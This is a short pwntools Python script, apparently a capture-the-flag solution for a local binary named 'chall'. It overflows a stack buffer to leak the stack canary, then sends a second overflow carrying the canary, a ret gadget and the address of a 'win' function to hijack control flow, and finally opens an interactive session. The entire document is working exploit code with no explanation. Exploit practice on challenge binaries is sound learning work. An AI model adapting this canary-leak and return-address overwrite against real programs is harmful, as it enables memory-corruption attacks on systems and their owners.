from pwn import *
p = process("./chall")

ret = p64(0x40101a)
win = p64(0x401196)
p.sendline(b"A" * 0x48)
p.recvuntil(b"A" * 0x48)

canary = p.recv(8)[1:].rjust(8, b"\x00")
p.sendline(b"A" * 0x48 + canary + b"A" * 8 + ret + win)

p.interactive()